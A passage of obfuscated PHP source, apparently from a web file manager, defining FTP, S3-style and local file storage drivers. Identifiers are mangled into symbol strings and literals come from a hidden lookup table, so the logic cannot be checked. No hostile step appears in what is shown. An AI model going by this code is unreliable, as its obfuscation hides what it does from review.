$ΚΜΚΎ± = 1) { $σΌκ«Σ =& $_SERVER[γγάψ½]; $»ΙΏ―ο¦ = Model($σΌκ«Σ[1439]); $ΎΓΫ™® = Model($σΌκ«Σ[2325]); $ήΤΧόλ› = array($σΌκ«Σ[194] => $§ΤΩΌΒ΄); if ($ΚΜΚΎ±) { $»ΙΏ―ο¦->where($ήΤΧόλ›)->setField($σΌκ«Σ[508], 1); $ΎΓΫ™®->eventRecycle($§ΤΩΌΒ΄, $σΌκ«Σ[2326]); } else { $¤Ν‘Ή³ = $»ΙΏ―ο¦->where($ήΤΧόλ›)->find(); $¦¦»οω = $¤Ν‘Ή³[$σΌκ«Σ[488]] == $σΌκ«Σ[91]; $―οµγε = $»ΙΏ―ο¦->fileNameAuto($¤Ν‘Ή³[$σΌκ«Σ[193]], $¤Ν‘Ή³[$σΌκ«Σ[32]], REPEAT_RENAME_FOLDER, $¦¦»οω); if ($―οµγε != $¤Ν‘Ή³[$σΌκ«Σ[32]]) { $»ΙΏ―ο¦->rename($§ΤΩΌΒ΄, $―οµγε); } $»ΙΏ―ο¦->where($ήΤΧόλ›)->setField($σΌκ«Σ[508], 0); $ΎΓΫ™®->eventRecycle($§ΤΩΌΒ΄, $σΌκ«Σ[2327]); } } } goto BΜΐίω…Όέ; a¦…σΕΑ‡Δ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ΰ‚β“±©) { parent::__construct(); if (count($ΰ‚β“±©) > 0) { $this->_init($ΰ‚β“±©); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ρέ–¬Ά±) { $®ΑΦΧΥ =& $_SERVER[γγάψ½]; global $config; $this->appCharset = $config[$®ΑΦΧΥ[1457]]; $this->systemCharset = $config[$®ΑΦΧΥ[1458]]; if (isset($Ρέ–¬Ά±[$®ΑΦΧΥ[1459]]) && $Ρέ–¬Ά±[$®ΑΦΧΥ[1459]]) { $this->systemCharset = $Ρέ–¬Ά±[$®ΑΦΧΥ[1459]]; } } public function iconvApp($’‘ ΐη) { return $this->iconvTo($’‘ ΐη, $this->systemCharset, $this->appCharset); } public function iconvSystem($κΟτ«ΣΚ) { return $this->iconvTo($κΟτ«ΣΚ, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ω›–ϋΘύ) { $»ΰ¬Ν =& $_SERVER[γγάψ½]; $‚¬¨ΜΧ΄ = $this->iconvApp($this->pathBase); $Ω›–ϋΘύ = $this->iconvApp($Ω›–ϋΘύ); if (substr($‚¬¨ΜΧ΄, 0, 2) == $»ΰ¬Ν[1429]) { $‚¬¨ΜΧ΄ = BASIC_PATH . substr($‚¬¨ΜΧ΄, 2); } if (substr($Ω›–ϋΘύ, 0, 2) == $»ΰ¬Ν[1429]) { $Ω›–ϋΘύ = BASIC_PATH . substr($Ω›–ϋΘύ, 2); } $‚¬¨ΜΧ΄ = KodIO::clear($‚¬¨ΜΧ΄); $Ω›–ϋΘύ = KodIO::clear($Ω›–ϋΘύ); $Ω›–ϋΘύ = substr($Ω›–ϋΘύ, strlen($‚¬¨ΜΧ΄)); if (empty($this->pathDriver)) { return $Ω›–ϋΘύ; } return $this->pathDriver . $»ΰ¬Ν[8] . ltrim($Ω›–ϋΘύ, $»ΰ¬Ν[8]); } private function _init($κυφ¥ΛΪ = array()) { $”ύυ·«ο =& $_SERVER[γγάψ½]; if (!function_exists($”ύυ·«ο[1460])) { throw new Exception(LNG($”ύυ·«ο[1461])); } $this->config = $κυφ¥ΛΪ; $this->charsetReset($κυφ¥ΛΪ); foreach ($κυφ¥ΛΪ as $ς―Ρ‡‘ => $¨ΧΡΊΑ) { if (isset($this->{$ς―Ρ‡‘})) { $this->{$ς―Ρ‡‘} = $¨ΧΡΊΑ; } } return $this->_login($κυφ¥ΛΪ); } private function _login($¦Ώέύ‹Ό) { $‹„½ƒ¶ =& $_SERVER[γγάψ½]; static $ς―‰ηΞώ = array(); $σ‹®©ε = md5(json_encode($¦Ώέύ‹Ό)); if (isset($ς―‰ηΞώ[$σ‹®©ε])) { foreach ($ς―‰ηΞώ[$σ‹®©ε] as $µΥ΄ΦΊ => $„τΤΑώ) { $this->{$µΥ΄ΦΊ} = $„τΤΑώ; } return !0; } $ΗΛΧΕόΟ = parse_url(trim($this->server, $‹„½ƒ¶[8])); $this->host = $ΗΛΧΕόΟ[$‹„½ƒ¶[209]]; $ΈΌβΧχ = isset($ΗΛΧΕόΟ[$‹„½ƒ¶[208]]) && $ΗΛΧΕόΟ[$‹„½ƒ¶[208]] == $‹„½ƒ¶[1462] ? !0 : !1; $this->scheme = $ΈΌβΧχ ? $‹„½ƒ¶[1463] : $‹„½ƒ¶[1464]; $this->port = isset($ΗΛΧΕόΟ[$‹„½ƒ¶[210]]) ? $ΗΛΧΕόΟ[$‹„½ƒ¶[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($‹„½ƒ¶[1465]) . $this->host . $‹„½ƒ¶[4] . $this->port, !0); return !1; } $”΄δΦΐ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$”΄δΦΐ) { $this->writeLog(LNG($‹„½ƒ¶[1466]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $‹„½ƒ¶[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¦σΫΥη = $this->pasv == $‹„½ƒ¶[91] ? !0 : !1; @ftp_pasv($this->connect, $¦σΫΥη); $ς―‰ηΞώ[$σ‹®©ε] = array($‹„½ƒ¶[1467] => $this->connect, $‹„½ƒ¶[209] => $this->host, $‹„½ƒ¶[208] => $this->scheme, $‹„½ƒ¶[210] => $this->port); return $”΄δΦΐ; } private function _isconn($Ίή–¨ = true) { if (is_resource($this->connect)) { return !0; } if (!$Ίή–¨) { return !1; } return $this->_login($this->config); } public function mkfile($‘Ύβ°·, $τΌΛξ§¥ = '', $ριΒξ¶μ = REPEAT_RENAME) { if ($this->setContent($‘Ύβ°·, $τΌΛξ§¥)) { return $this->getPathOuter($‘Ύβ°·); } $this->writeLog(LNG($_SERVER[γγάψ½][1468]), !0); return !1; } public function mkdir($ΡΞυΒα, $Ύ΄λΫθ = REPEAT_SKIP) { $Ρ–ΐ =& $_SERVER[γγάψ½]; if (!$ΡΞυΒα || $ΡΞυΒα == $Ρ–ΐ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ΡΞυΒα = $this->iconvSystem($ΡΞυΒα); if ($this->_isFolder($ΡΞυΒα) || @ftp_mkdir($this->connect, $ΡΞυΒα)) { return $this->getPathOuter($ΡΞυΒα); } if (!$this->mkdir($this->pathFather($ΡΞυΒα))) { return !1; } if ($ΡΞυΒα = @ftp_mkdir($this->connect, $ΡΞυΒα)) { return $this->getPathOuter($ΡΞυΒα); } $Ηβ»™― = __FUNCTION__ . $Ρ–ΐ[1469]; $this->writeLog($Ηβ»™―, !0); return !1; } public function copyFile($‘΄ϊ²–ξ, $δ’§Ή) { if (!$this->_isconn()) { return !1; } $ς…ύΉχ = $this->pathThis($this->iconvSystem($‘΄ϊ²–ξ)); $ΰ–°€Ώ‹ = $this->tempFile($ς…ύΉχ); $Ρ»»β = $this->iconvApp($ΰ–°€Ώ‹); $this->download($‘΄ϊ²–ξ, $Ρ»»β); $±Σά…· = $this->upload($δ’§Ή, $Ρ»»β); $this->tempFileRemve($ΰ–°€Ώ‹); return $±Σά…·; } public function moveFile($‹πΛ«α, $«ƒω Ϋ) { if (!$this->_isconn()) { return !1; } $‹πΛ«α = $this->iconvSystem($‹πΛ«α); $«ƒω Ϋ = $this->iconvSystem($«ƒω Ϋ); $¥λΒθ = @ftp_rename($this->connect, $‹πΛ«α, $«ƒω Ϋ); if (!$¥λΒθ) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } return $this->getPathOuter($«ƒω Ϋ); } public function delFile($Ϋ¨Ω±®Ώ) { if (!$this->_isconn()) { return !1; } $Ϋ¨Ω±®Ώ = $this->iconvSystem($Ϋ¨Ω±®Ώ); $σρ™Γ„Ύ = @ftp_delete($this->connect, $Ϋ¨Ω±®Ώ); if (!$σρ™Γ„Ύ) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); } return $σρ™Γ„Ύ; } public function delFolder($ λ«Υγ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $±”·¦Σ = $σ§Ό = array(); $this->fileList($ λ«Υγ, $±”·¦Σ, $σ§Ό, !0); $this->listItemCache = !0; foreach ($σ§Ό as $Ή£ΜίΒ΄) { $Ϊνο±ϋ = $this->iconvSystem($Ή£ΜίΒ΄[$_SERVER[γγάψ½][32]]); $ΓΘσΗ = @ftp_delete($this->connect, $Ϊνο±ϋ); if (!$ΓΘσΗ) { return !1; } } foreach ($±”·¦Σ as $Ϊνο±ϋ) { $Ϊνο±ϋ = $this->iconvSystem($Ϊνο±ϋ); $ΓΘσΗ = @ftp_rmdir($this->connect, $Ϊνο±ϋ); if (!$ΓΘσΗ) { return !1; } } $ λ«Υγ = $this->iconvSystem($ λ«Υγ); return @ftp_rmdir($this->connect, $ λ«Υγ); } public function rename($Έ·²ξίΨ, $ξΩςολα) { $όΞντΕ½ =& $_SERVER[γγάψ½]; if (!$this->_isconn()) { return !1; } $ΠχΏΠΌΠ = $this->fileNameAuto($this->pathFather($Έ·²ξίΨ), $ξΩςολα); $ΠχΏΠΌΠ = $this->iconvSystem($ΠχΏΠΌΠ); $Έ·²ξίΨ = $this->iconvSystem($Έ·²ξίΨ); $ΏΙξό½ƒ = $this->pathFather($Έ·²ξίΨ); $ΙΰΉόΧΠ = rtrim($ΏΙξό½ƒ, $όΞντΕ½[8]) . $όΞντΕ½[8] . $ΠχΏΠΌΠ; $―’ = @ftp_rename($this->connect, $Έ·²ξίΨ, $ΙΰΉόΧΠ); if (!$―’) { $this->writeLog(__FUNCTION__ . $όΞντΕ½[1469], !0); return !1; } $ΙΰΉόΧΠ = $this->iconvApp($ΙΰΉόΧΠ); return $this->getPathOuter($ΙΰΉόΧΠ); } private function folderInfo($ϋΨΥι, $ΣΣΘ• = false) { $©™όία =& $_SERVER[γγάψ½]; $Ρ—Ώ = array($©™όία[32] => $this->pathThis($ϋΨΥι), $©™όία[87] => $this->getPathOuter($©™όία[8] . $ϋΨΥι), $©™όία[33] => $©™όία[78]); if ($ΣΣΘ•) { return $Ρ—Ώ; } $Ρ—Ώ[$©™όία[234]] = $Ρ—Ώ[$©™όία[88]] = 0; $Ρ—Ώ[$©™όία[235]] = $Ρ—Ώ[$©™όία[236]] = !0; return $Ρ—Ώ; } private function fileInfo($μ•, $τΩίΡ“› = false, $ιίΧ£΄‹ = array()) { $½‚£―…µ =& $_SERVER[γγάψ½]; $…ΓΛτθΏ = array($½‚£―…µ[32] => $this->pathThis($μ•), $½‚£―…µ[87] => $this->getPathOuter($½‚£―…µ[8] . $μ•), $½‚£―…µ[33] => $½‚£―…µ[233], $½‚£―…µ[79] => isset($ιίΧ£΄‹[$½‚£―…µ[79]]) ? $ιίΧ£΄‹[$½‚£―…µ[79]] : 0, $½‚£―…µ[169] => $this->ext($μ•)); if ($τΩίΡ“›) { return $…ΓΛτθΏ; } $…ΓΛτθΏ[$½‚£―…µ[234]] = $…ΓΛτθΏ[$½‚£―…µ[88]] = 0; $…ΓΛτθΏ[$½‚£―…µ[235]] = $…ΓΛτθΏ[$½‚£―…µ[236]] = !0; $¬¨Σλ»® = $this->iconvSystem($μ•); $…ΓΛτθΏ[$½‚£―…µ[88]] = @ftp_mdtm($this->connect, $¬¨Σλ»®); if (empty($ιίΧ£΄‹)) { $ιίΧ£΄‹ = $this->objectMeta($μ•); if (!$ιίΧ£΄‹) { return $…ΓΛτθΏ; } } $…ΓΛτθΏ[$½‚£―…µ[79]] = $ιίΧ£΄‹[$½‚£―…µ[79]]; return $…ΓΛτθΏ; } public function size($ύΤΕ“΄) { $±«¨„»‰ = $this->objectMeta($ύΤΕ“΄); return $±«¨„»‰ ? $±«¨„»‰[$_SERVER[γγάψ½][79]] : 0; } public function info($Ξ­―β”Ξ) { if ($this->isFile($Ξ­―β”Ξ)) { return $this->fileInfo($Ξ­―β”Ξ, 0); } else { if ($this->isFolder($Ξ­―β”Ξ)) { return $this->folderInfo($Ξ­―β”Ξ); } } return !1; } private function fileList($ήΡΐΊ, &$σ΅ι±Τ², &$½ά…ϊΨς, $ ³–ί ΰ = false) { $ ΒφΧ§γ =& $_SERVER[γγάψ½]; $ήΡΐΊ = $this->iconvSystem($ήΡΐΊ); if (!$this->isFolder($ήΡΐΊ)) { return !1; } $ήΡΐΊ = rtrim($ήΡΐΊ, $ ΒφΧ§γ[8]) . $ ΒφΧ§γ[8]; check_abort(); $‡σΆΐ = @ftp_rawlist($this->connect, $ήΡΐΊ); if (!$‡σΆΐ) { $‡σΆΐ = array(); } $Υ€Νε®ώ = array($ ΒφΧ§γ[10] => 1, $ ΒφΧ§γ[1374] => 1); foreach ($‡σΆΐ as $ύΌβ”·Ό) { $—ίΒΆ¶μ = $this->_listItem($ύΌβ”·Ό); if ($—ίΒΆ¶μ[0] == $ ΒφΧ§γ[833]) { continue; } $Ρθ‰²Β = $—ίΒΆ¶μ[8]; if (empty($Ρθ‰²Β) && $Ρθ‰²Β !== $ ΒφΧ§γ[231] || isset($Υ€Νε®ώ[$Ρθ‰²Β])) { continue; } $Ρθ‰²Β = $this->iconvApp($ήΡΐΊ . ltrim($Ρθ‰²Β, $ ΒφΧ§γ[8])); $ϋξ½σ = array($ ΒφΧ§γ[32] => $Ρθ‰²Β, $ ΒφΧ§γ[33] => $ ΒφΧ§γ[233], $ ΒφΧ§γ[79] => $—ίΒΆ¶μ[4]); if (substr($ύΌβ”·Ό, 0, 1) == $ ΒφΧ§γ[1470]) { $ϋξ½σ[$ ΒφΧ§γ[33]] = $ ΒφΧ§γ[78]; $ϋξ½σ[$ ΒφΧ§γ[79]] = 0; } $·τΒΧΆΒ = $ϋξ½σ[$ ΒφΧ§γ[33]] == $ ΒφΧ§γ[78] ? !0 : !1; $this->cacheMethodInfoSet($Ρθ‰²Β, $·τΒΧΆΒ, $ϋξ½σ); if ($·τΒΧΆΒ) { $σ΅ι±Τ²[] = $Ρθ‰²Β; if ($ ³–ί ΰ) { $this->fileList($Ρθ‰²Β, $σ΅ι±Τ², $½ά…ϊΨς, $ ³–ί ΰ); } continue; } $½ά…ϊΨς[] = $ϋξ½σ; } $this->cacheMethodInfoSet($ήΡΐΊ, !0); } private function _listItem($Ω°“…ά) { if (empty($Ω°“…ά)) { return array(); } $ΆρΓσΩΐ = preg_split($_SERVER[γγάψ½][1471], $Ω°“…ά); if (count($ΆρΓσΩΐ) <= 9) { return $ΆρΓσΩΐ; } $ΆρΓσΩΐ[8] = trim(substr($Ω°“…ά, strpos($Ω°“…ά, $ΆρΓσΩΐ[7]) + strlen($ΆρΓσΩΐ[7]))); return array_splice($ΆρΓσΩΐ, 0, 9); } public function listPath($ΫβόΎΪƒ, $έυΘϊσ = false) { $Τΰαλό΅ =& $_SERVER[γγάψ½]; if (!$this->_isconn()) { return !1; } $Ώ―τ§― = $³µλ”ξΪ = array(); $this->fileList($ΫβόΎΪƒ, $Ώ―τ§―, $³µλ”ξΪ); foreach ($Ώ―τ§― as $Ψ‚µνΫΡ => $‘χµ®Β) { $Ώ―τ§―[$Ψ‚µνΫΡ] = $this->folderInfo($‘χµ®Β, $έυΘϊσ); } foreach ($³µλ”ξΪ as $Ψ‚µνΫΡ => $‘χµ®Β) { $³µλ”ξΪ[$Ψ‚µνΫΡ] = $this->fileInfo($‘χµ®Β[$Τΰαλό΅[32]], $έυΘϊσ, $‘χµ®Β); } return array($Τΰαλό΅[85] => $Ώ―τ§―, $Τΰαλό΅[86] => $³µλ”ξΪ); } public function has($Θ¥εο, $ς–›‰ξ = false, $•Φ™„θ = true) { $κΛψ¬Ώ =& $_SERVER[γγάψ½]; $€©”–φΤ = $‹Αθ  = array(); $δ‚£§¨ = $ς–›‰ξ ? !0 : !1; $this->fileList($Θ¥εο, $€©”–φΤ, $‹Αθ , $δ‚£§¨); if ($ς–›‰ξ) { return array($κΛψ¬Ώ[242] => count($‹Αθ ), $κΛψ¬Ώ[243] => count($€©”–φΤ)); } if ($•Φ™„θ) { if (count($‹Αθ )) { return !0; } } else { if (count($€©”–φΤ)) { return !0; } } return !1; } public function listAll($›¥όΛ) { $¨ηθΖ“Α =& $_SERVER[γγάψ½]; if (!$this->_isconn()) { return !1; } $πνξψµυ = $Β‚χΐ—Ρ = array(); $this->fileList($›¥όΛ, $πνξψµυ, $Β‚χΐ—Ρ, !0); $’ηύφµ– = array_to_keyvalue($Β‚χΐ—Ρ, $¨ηθΖ“Α[32]); foreach ($πνξψµυ as $ΐμ΄ψ½) { if (is_string($ΐμ΄ψ½)) { $’ηύφµ–[$ΐμ΄ψ½] = array($¨ηθΖ“Α[79] => 0); } } return $this->listAllFiles($›¥όΛ, $’ηύφµ–); } public function getContent($ΫΉΪθω) { if (!$this->_isconn()) { return !1; } $ΫΉΪθω = $this->iconvSystem($ΫΉΪθω); return $this->fileSubstr($ΫΉΪθω); } public function setContent($Ζϊυ“, $¨¤πτ = '') { if (!$this->_isconn()) { return !1; } $½ο›ΕΔ― = $this->pathThis($this->iconvSystem($Ζϊυ“)); $ΠΏ­Υ®¬ = $this->tempFile($½ο›ΕΔ―); file_put_contents($ΠΏ­Υ®¬, $¨¤πτ); $Κο‡½«Ϊ = $this->upload($Ζϊυ“, $this->iconvApp($ΠΏ­Υ®¬)); $this->tempFileRemve($ΠΏ­Υ®¬); return $Κο‡½«Ϊ; } public function fileSubstr($“ω¤Υ©, $΅‰ΒδοΥ = 0, $‡Ψάΰ°έ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($“ω¤Υ©, $΅‰ΒδοΥ, $‡Ψάΰ°έ); } private function ftpRequest($Κ•τι­Ύ, $›Ρ‰‹Με = 0, $ηΘΊξ• = false) { $δ“φΞ‡ι =& $_SERVER[γγάψ½]; $Κ•τι­Ύ = $δ“φΞ‡ι[8] . ltrim(str_ltrim($Κ•τι­Ύ, $this->ftpPath), $δ“φΞ‡ι[8]); $Κ•τι­Ύ = $this->iconvSystem($Κ•τι­Ύ); $» ‡ΏΤ = $this->scheme . $this->host . $δ“φΞ‡ι[4] . $this->port; $ΒΚΊ―ΪΖ = curl_init(); curl_setopt($ΒΚΊ―ΪΖ, CURLOPT_URL, $» ‡ΏΤ . $this->pathEncode($Κ•τι­Ύ)); curl_setopt($ΒΚΊ―ΪΖ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ηΘΊξ•) { $°ΧΞΡ» = $›Ρ‰‹Με + $ηΘΊξ• - 1; curl_setopt($ΒΚΊ―ΪΖ, CURLOPT_RANGE, "{$›Ρ‰‹Με}\x2d{$°ΧΞΡ»}"); } curl_setopt($ΒΚΊ―ΪΖ, CURLOPT_RETURNTRANSFER, 1); $‘μ³³ = curl_exec($ΒΚΊ―ΪΖ); curl_close($ΒΚΊ―ΪΖ); return $‘μ³³; } public function upload($ΣΔ‡¤ήξ, $―ν“ωµμ, $Σρβ‰Τ = false, $ΩΆίΏΝ€ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ΣΔ‡¤ήξ))) { return !1; } $ΣΔ‡¤ήξ = $this->iconvSystem($ΣΔ‡¤ήξ); $―ν“ωµμ = $this->iconvSystem($―ν“ωµμ); $Ή–Ϋ±Άί = ftp_nb_put($this->connect, $ΣΔ‡¤ήξ, $―ν“ωµμ, FTP_BINARY); while ($Ή–Ϋ±Άί == FTP_MOREDATA) { $Ή–Ϋ±Άί = ftp_nb_continue($this->connect); } if ($Ή–Ϋ±Άί != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } return $this->getPathOuter($ΣΔ‡¤ήξ); } public function download($ΰΤ‘„Τς, $°¤χΦ‡ = '') { if (!$this->_isconn()) { return !1; } $ΟΘιΈ = $this->pathFather($°¤χΦ‡); if (!IO::mkdir($ΟΘιΈ)) { return !1; } $ΰΤ‘„Τς = $this->iconvSystem($ΰΤ‘„Τς); $°¤χΦ‡ = $this->iconvSystem($°¤χΦ‡); $όηΎβ™Έ = ftp_nb_get($this->connect, $°¤χΦ‡, $ΰΤ‘„Τς, FTP_BINARY); while ($όηΎβ™Έ == FTP_MOREDATA) { $όηΎβ™Έ = ftp_nb_continue($this->connect); } if ($όηΎβ™Έ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } return $this->iconvApp($°¤χΦ‡); } public function exist($ΣΖ¬Φ°Ό) { return $this->isFile($ΣΖ¬Φ°Ό) || $this->isFolder($ΣΖ¬Φ°Ό); } public function isFile($Αΰ‡ψό¨) { return !$this->isFolder($Αΰ‡ψό¨) && $this->objectMeta($Αΰ‡ψό¨); } public function isFolder($λ΄Η―γ“) { return $this->cacheMethod($_SERVER[γγάψ½][180], $λ΄Η―γ“); } protected function objectMeta($ξΜΜΞ›‰) { return $this->cacheMethod($_SERVER[γγάψ½][182], $ξΜΜΞ›‰); } protected function _objectMeta($―Σν›) { $Τόίϋ― =& $_SERVER[γγάψ½]; if ($―Σν› == $Τόίϋ―[12] || $―Σν› == $Τόίϋ―[8]) { return array(); } if (!$this->_isconn()) { return !1; } $―Σν› = $this->iconvSystem($―Σν›); $µκ„™©β = array($Τόίϋ―[32] => $this->iconvApp($―Σν›), $Τόίϋ―[33] => $Τόίϋ―[233], $Τόίϋ―[79] => 0); $ϊθΊΪΒ = @ftp_size($this->connect, $―Σν›); if ($ϊθΊΪΒ != -1) { $µκ„™©β[$Τόίϋ―[79]] = $ϊθΊΪΒ; } else { $λ“Ϊ› = @ftp_chdir($this->connect, $―Σν›); if (!$λ“Ϊ›) { return !1; } @ftp_chdir($this->connect, $Τόίϋ―[8]); $µκ„™©β[$Τόίϋ―[33]] = $Τόίϋ―[78]; } return $µκ„™©β; } protected function _isFolder($Μώ³πα) { $—©†Φ =& $_SERVER[γγάψ½]; if ($Μώ³πα == $—©†Φ[12] || $Μώ³πα == $—©†Φ[8]) { return !0; } $όζζ­Ύ¦ = $this->_objectMeta($Μώ³πα); return isset($όζζ­Ύ¦[$—©†Φ[33]]) && $όζζ­Ύ¦[$—©†Φ[33]] == $—©†Φ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($΄Θ…‰΄) { parent::__construct($΄Θ…‰΄); $this->setSignVersion($_SERVER[γγάψ½][250]); } public function uploadLink($­½¬†, $Νρƒ”ω = 0) { $Δ‚Ο„ =& $_SERVER[γγάψ½]; if ($this->isUploadServer()) { return; } $ΆΝχξ³ = $this->getType(); if (!in_array($ΆΝχξ³, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ύ™ΰΦ±Ύ = (!$Νρƒ”ω ? 1 : ceil($Νρƒ”ω / pow(1024, 3))) * 3600 * 4; $ΧέΉΡΔ¦ = $this->uploadMultiData($­½¬†, $Ύ™ΰΦ±Ύ); if ($ΧέΉΡΔ¦) { $ΧέΉΡΔ¦[$Δ‚Ο„[97]] = $­½¬†; $ΧέΉΡΔ¦[$Δ‚Ο„[98]] = $ΆΝχξ³; } return $ΧέΉΡΔ¦; } public function fileOutImage($ΨΒΤΞ­Ψ, $έώ®¶ά’ = 250) { if ($this->size($ΨΒΤΞ­Ψ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ΨΒΤΞ­Ψ, $έώ®¶ά’); } $Λ―υΐ€ = $this->link($ΨΒΤΞ­Ψ); $Λ―υΐ€ .= $_SERVER[γγάψ½][1472] . $έώ®¶ά’; $this->fileOutLink($Λ―υΐ€); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($θ†²) { if (substr($θ†², 0, 2) == $_SERVER[γγάψ½][1429]) { $θ†² = BASIC_PATH . substr($θ†², 2); } return $θ†²; } public function iconvApp($ΐψρΟ) { $ΨΆ“‘±ώ =& $_SERVER[γγάψ½]; global $config; return $this->iconvTo($ΐψρΟ, $config[$ΨΆ“‘±ώ[1458]], $config[$ΨΆ“‘±ώ[1457]]); } public function iconvSystem($Υκ΄¤) { $·Θ»ζ™³ =& $_SERVER[γγάψ½]; global $config; return $this->iconvTo($Υκ΄¤, $config[$·Θ»ζ™³[1457]], $config[$·Θ»ζ™³[1458]]); } public function getPathOuter($Γ«Λ•ιύ) { $Ή–Ζ¶χ =& $_SERVER[γγάψ½]; $§Ϋ€θπΎ = $this->iconvApp($this->pathBase); $Γ«Λ•ιύ = $this->iconvApp($Γ«Λ•ιύ); if (substr($§Ϋ€θπΎ, 0, 2) == $Ή–Ζ¶χ[1429]) { $§Ϋ€θπΎ = BASIC_PATH . substr($§Ϋ€θπΎ, 2); } if (substr($Γ«Λ•ιύ, 0, 2) == $Ή–Ζ¶χ[1429]) { $Γ«Λ•ιύ = BASIC_PATH . substr($Γ«Λ•ιύ, 2); } $§Ϋ€θπΎ = KodIO::clear($§Ϋ€θπΎ); $Γ«Λ•ιύ = KodIO::clear($Γ«Λ•ιύ); $Γ«Λ•ιύ = substr($Γ«Λ•ιύ, strlen($§Ϋ€θπΎ)); if (empty($this->pathDriver)) { return $Γ«Λ•ιύ; } return $this->pathDriver . $Ή–Ζ¶χ[8] . ltrim($Γ«Λ•ιύ, $Ή–Ζ¶χ[8]); } public function mkfile($¶‚ΚΣ…, $¦Ζ’΅Ϊ = '', $ζΥ°ό­ρ = REPEAT_RENAME) { $¶‚ΚΣ… = $this->iconvSystem($¶‚ΚΣ…); @touch($¶‚ΚΣ…); if ($¦Ζ’΅Ϊ) { file_put_contents($¶‚ΚΣ…, $¦Ζ’΅Ϊ); } @chmod($¶‚ΚΣ…, $this->pathAuth); if (is_file($¶‚ΚΣ…)) { return $this->getPathOuter($¶‚ΚΣ…); } $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } public function mkdir($Ϊ«ΑΕ„΅, $„σ…—„Π = REPEAT_SKIP) { $Ϊ«ΑΕ„΅ = $this->iconvSystem($Ϊ«ΑΕ„΅); if (is_dir($Ϊ«ΑΕ„΅)) { return $this->getPathOuter($Ϊ«ΑΕ„΅); } @mkdir($Ϊ«ΑΕ„΅, $this->pathAuth, !0); @chmod($Ϊ«ΑΕ„΅, $this->pathAuth); if (is_dir($Ϊ«ΑΕ„΅)) { return $this->getPathOuter($Ϊ«ΑΕ„΅); } $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } public function copyFile($μΡΚχ½·, $ΙΝΡ”®) { $this->mkdir($this->pathFather($ΙΝΡ”®)); $μΡΚχ½· = $this->iconvSystem($μΡΚχ½·); $ΙΝΡ”® = $this->iconvSystem($ΙΝΡ”®); $‘„²ΟΑσ = copy_64($μΡΚχ½·, $ΙΝΡ”®); @chmod($ΙΝΡ”®, $this->pathAuth); if ($‘„²ΟΑσ) { return $this->getPathOuter($ΙΝΡ”®); } $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } public function moveFile($‰Θυ΄ρ, $°Ν»¶ω) { $this->mkdir($this->pathFather($°Ν»¶ω)); $‰Θυ΄ρ = $this->iconvSystem($‰Θυ΄ρ); $°Ν»¶ω = $this->iconvSystem($°Ν»¶ω); $²ΦόΏ… = intval(@rename($‰Θυ΄ρ, $°Ν»¶ω)); if (!$²ΦόΏ…) { if ($²ΦόΏ… = intval(@copy_64($‰Θυ΄ρ, $°Ν»¶ω))) { @unlink($‰Θυ΄ρ); } } @chmod($°Ν»¶ω, $this->pathAuth); if ($²ΦόΏ…) { return $this->getPathOuter($°Ν»¶ω); } $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } public function movePath($ΑΝίτώπ, $ΛΉμ‘Ψ, $αΰέύ¦ = false) { $Ή°όηπΞ =& $_SERVER[γγάψ½]; $ΑΝίτώπ = $this->iconvSystem($ΑΝίτώπ); $ΛΉμ‘Ψ = $this->iconvSystem($ΛΉμ‘Ψ); $Ω‘Ο±  = rtrim($ΛΉμ‘Ψ, $Ή°όηπΞ[8]) . $Ή°όηπΞ[8] . ($αΰέύ¦ ? $αΰέύ¦ : get_path_this($ΑΝίτώπ)); if (file_exists($Ω‘Ο± )) { return !1; } $›νΛαΫ— = intval(@rename($ΑΝίτώπ, $Ω‘Ο± )); $›νΛαΫ— = file_exists($Ω‘Ο± ); if ($›νΛαΫ—) { return $this->getPathOuter($Ω‘Ο± ); } $this->writeLog(__FUNCTION__ . $Ή°όηπΞ[1469], !0); return !1; } public function delFile($¥‰›”Ύ) { $¥‰›”Ύ = $this->iconvSystem($¥‰›”Ύ); if (!@unlink($¥‰›”Ύ)) { @chmod($¥‰›”Ύ, $this->pathAuth); if (@unlink($¥‰›”Ύ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][1469], !0); return !1; } return !0; } public function delFolder($―£§¦©) { $Ψ‰”ζΏέ =& $_SERVER[γγάψ½]; $―£§¦© = $this->iconvSystem($―£§¦©); if (!is_dir($―£§¦©)) { return !0; } if (!($ΑΗε = opendir($―£§¦©))) { return !1; } while (($¥ΡΝμΦ = readdir($ΑΗε)) !== !1) { if ($¥ΡΝμΦ == $Ψ‰”ζΏέ[10] || $¥ΡΝμΦ == $Ψ‰”ζΏέ[1374]) { continue; } 